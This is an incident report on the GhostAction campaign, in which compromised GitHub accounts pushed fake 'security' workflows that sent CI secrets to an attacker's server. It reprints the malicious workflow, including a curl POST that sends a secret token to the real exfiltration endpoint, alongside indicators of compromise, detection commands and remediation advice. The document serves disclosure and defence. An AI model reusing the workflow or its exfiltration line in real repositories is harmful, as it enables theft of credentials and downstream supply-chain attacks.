# GhostAction Campaign — 3,325 Secrets Stolen via Malicious GitHub Workflows

**Date:** September 2025
**Ecosystem:** GitHub Actions
**Severity:** High
**Type:** Malicious workflow injection / CI/CD secret exfiltration
**Sources:**
- [StepSecurity — GhostAction Campaign: Over 3,000 Secrets Stolen Through Malicious GitHub Workflows](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows)

---

## Summary

On **September 5, 2025**, GitGuardian security researchers Gaetan Ferry and Guillaume Valadon uncovered "GhostAction," a coordinated supply chain attack campaign that compromised **327 GitHub user accounts** across **817 repositories**, successfully exfiltrating **3,325 secrets** to an attacker-controlled endpoint.

The attackers pushed malicious workflow files disguised as security improvements — titled "Add Github Actions Security workflow" — into repositories belonging to compromised developer accounts. Each workflow was customized with the specific secret names present in the target repository, then triggered on every `push` event to silently exfiltrate credentials via a `curl` POST to an attacker-controlled Plesk subdomain. Multiple companies had their entire SDK portfolio compromised across Python, Rust, JavaScript, and Go repositories in a single cascading incident.

Despite the breadth of access achieved — including npm, PyPI, and DockerHub publishing tokens — no malicious package releases were detected. GitGuardian's rapid disclosure and immediate response from the community, including issuing 573 repository alerts, contained the damage before stolen registry credentials could be weaponized for downstream supply chain attacks.

---

## Compromised Artifacts

| Affected Scope | Count |
|----------------|-------|
| GitHub user accounts compromised | 327 |
| Repositories affected | 817 |
| Secrets exfiltrated | 3,325 |
| Repositories that had already reverted changes at disclosure | 100+ |

**Secret types stolen:**

| Secret Type | Notes |
|-------------|-------|
| DockerHub credentials | Most common type |
| GitHub personal access tokens | High-privilege; enabled further repo access |
| npm authentication tokens | Could enable malicious package publishes |
| PyPI API tokens | Could enable malicious PyPI publishes |
| AWS access keys | Cloud infrastructure access |
| Database credentials | Direct data access risk |
| Cloudflare API tokens | DNS/proxy control |

---

## How It Worked

### Entry Point: Compromised Developer Accounts

Attackers first obtained access to developer GitHub accounts (exact method not publicly disclosed — likely credential stuffing or prior phishing). With account access, they pushed malicious workflow files directly to any repository the account had write access to.

### Payload: Minimal Exfiltration Workflow

The malicious workflow was deliberately simple to avoid triggering security reviews. It masqueraded as a legitimate security hardening file:

```yaml
name: Github Actions Security
on:
  workflow_dispatch:
  push:
jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CODECOV_TOKEN=${{ secrets.CODECOV_TOKEN }}' \
            https://bold-dhawan.45-139-104-115.plesk.page
```

Each workflow was tailored: attackers first scanned the repository's existing workflow files to identify the secret names in use, then injected a customized workflow referencing those exact secret names. The `CACHE_BUST` step added apparent legitimacy by mimicking CI pipeline optimization patterns.

### Attack Methodology (Three Steps)

1. **Secret Enumeration** — Attackers read legitimate workflow files in each target repository to identify all secret variable names referenced (`secrets.CODECOV_TOKEN`, `secrets.NPM_TOKEN`, `secrets.AWS_ACCESS_KEY`, etc.)
2. **Workflow Customization** — A tailored workflow was crafted with the exact secret names for that repository, ensuring maximum exfiltration on first execution
3. **Immediate Execution** — The `push` trigger caused the workflow to fire immediately upon commit, exfiltrating secrets in the same CI run that delivered the malicious file

### C2 / Exfiltration

- **Endpoint:** `https://bold-dhawan[.]45-139-104-115[.]plesk[.]page`
- **IP:** `45.139.104.115`
- **Hosting provider:** 493networking.cc
- **Method:** HTTP POST via `curl`, delivering secrets as form body parameters
- **Endpoint shutdown:** September 5, 2025 at approximately **16:15 UTC**, coinciding with GitGuardian's public disclosure

The domain naming pattern and throwaway hosting infrastructure indicate a disposable C2 designed for a single-campaign use.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Sep 5, 2025 (morning) | GitGuardian's internal monitoring flags anomalous workflow in FastUUID project |
| Sep 5, 2025 | Gaetan Ferry and Guillaume Valadon begin investigating broader campaign |
| Sep 5, 2025 | GitGuardian identifies 817 affected repositories across 327 accounts |
| Sep 5, 2025 | GitGuardian creates issues in 573 compromised repositories; notifies PyPI, npm, and DockerHub security teams |
| Sep 5, 2025 ~16:15 UTC | Exfiltration endpoint `bold-dhawan.45-139-104-115.plesk.page` goes offline |
| Sep 5, 2025 (ongoing) | Community response: 100+ repositories revert malicious changes before disclosure |
| Sep 19, 2025 | StepSecurity publishes detailed analysis and enterprise mitigation guidance |

---

## Detection

```bash
# Search GitHub for the malicious exfiltration endpoint in your org
# (replace 'your-org' with your GitHub organization name)
# https://github.com/search?q=bold-dhawan.45-139-104-115.plesk.page+org%3Ayour-org&type=code

# Audit all workflow files for the suspicious workflow name
grep -r "Github Actions Security" .github/workflows/

# Search for the malicious curl exfiltration pattern
grep -r "bold-dhawan" .github/workflows/
grep -r "45-139-104-115.plesk.page" .github/workflows/

# List all workflow files modified in a suspicious timeframe (adjust dates)
git log --all --oneline --diff-filter=A -- .github/workflows/ \
  --after="2025-09-01" --before="2025-09-10"

# Review network calls from recent Actions runs for the C2 IP
# (In Harden-Runner dashboards, search for: 45.139.104.115)

# Audit your secrets for any that may have been exposed
# Check if any workflows ran that pushed to this endpoint
grep -r "bold-dhawan\|45-139-104-115" .
```

---

## Remediation

1. **Search for the malicious workflow** across all repositories in your organization using GitHub search: `https://github.com/search?q=bold-dhawan.45-139-104-115.plesk.page+org%3AYOUR_ORG&type=code`
2. **Delete malicious workflow files** from all branches in every affected repository — not just the default branch
3. **Rotate all GitHub Actions secrets** that were accessible to any workflow in the affected repositories, including: npm tokens, PyPI tokens, DockerHub credentials, AWS keys, GitHub PATs, Cloudflare tokens, and database credentials
4. **Audit Actions run logs** for the dates September 1–10, 2025, to identify any workflow executions that may have successfully sent secrets
5. **Enable branch protection rules** requiring pull request reviews before workflow changes can be merged, adding a human review gate for `.github/workflows/` changes
6. **Implement a Secret Exfiltration Workflow Run Policy** to block new or modified workflows from accessing repository secrets until reviewed
7. **Configure Runner Label Policy** if your organization uses self-hosted runners — this prevents attackers' new workflows from selecting GitHub-hosted runners to bypass runtime monitoring
8. **Notify downstream users** of any packages whose registry tokens were compromised, even if no malicious publish occurred

---

## Lessons Learned

- **Simplicity is a bypass technique.** The malicious workflow contained no exotic code — just a standard `curl` POST using GitHub's built-in `secrets` context. It appeared plausible as a security hardening workflow, making it easy to miss in casual review.
- **Developer account compromise cascades.** A single compromised GitHub account can expose secrets across every repository that account has write access to, including organization-level repositories used to publish widely-distributed packages.
- **CI/CD secrets are high-value targets.** Stolen npm, PyPI, and DockerHub tokens represent the ability to publish malicious packages to any registry — turning a credential theft incident into a potential mass supply chain attack.
- **Trigger-on-push means immediate execution.** Unlike attacks that rely on a CI run being manually triggered, a `push` trigger causes the malicious workflow to fire instantly on delivery, minimizing the window for detection before secrets are sent.
- **Rapid community disclosure prevented downstream damage.** GitGuardian's rapid identification and notification meant that even though registry credentials were stolen, no malicious package releases were detected. Speed of disclosure is a critical defense variable.
- **Branch protection is a low-cost, high-impact control.** Requiring PR review for workflow changes would have stopped this attack at the point of injection — before any secrets were ever accessed.

---

## Indicators of Compromise

| Type | Value |
|------|-------|
| Exfiltration domain | `bold-dhawan[.]45-139-104-115[.]plesk[.]page` |
| Exfiltration IP | `45.139.104.115` |
| Hosting provider | `493networking.cc` |
| Malicious workflow title | `Github Actions Security` |
| Malicious workflow file push message | `Add Github Actions Security workflow` |

---

## Related Incidents

- [tj-actions/changed-files Compromise (Mar 2025)](./2025-03-tj-actions.md) — similar GitHub Actions secret theft via poisoned action tags
- [Checkmarx KICS GitHub Action Compromised (Mar 2026)](./2026-03-checkmarx-kics-action.md) — tag poisoning used to steal CI/CD secrets and dump runner memory
- [xygeni-action C2 Backdoor (Mar 2026)](./2026-03-xygeni-action.md) — interactive C2 shell via GitHub Actions tag poisoning
- [hackerbot-claw AI Attack Campaign (Feb 2026)](./2026-02-hackerbot-claw.md) — AI-powered bot exploiting GitHub Actions for RCE
